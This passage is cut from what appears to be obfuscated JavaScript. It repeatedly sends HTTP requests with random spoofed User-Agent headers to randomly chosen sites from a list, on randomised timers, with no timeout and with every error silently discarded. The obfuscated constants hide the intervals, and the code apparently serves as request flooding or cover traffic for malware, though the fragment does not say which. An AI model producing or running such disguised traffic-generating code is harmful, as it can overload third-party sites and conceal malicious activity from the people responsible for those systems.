    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
  })['catch'](h => {}), setInterval(() => {
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
  }, (0x266d + -0x1 * -0x276e + -0xc1 * 0x43) * getRandomInt(0x67e + -0x291 * 0x2 + -0x15b, -0x1f2f + -0x17b6 + -0xc6 * -0x47));
}, 0x9a9 * -0x1 + -0x1 * -0xfd3 + 0x2e3 * -0x2);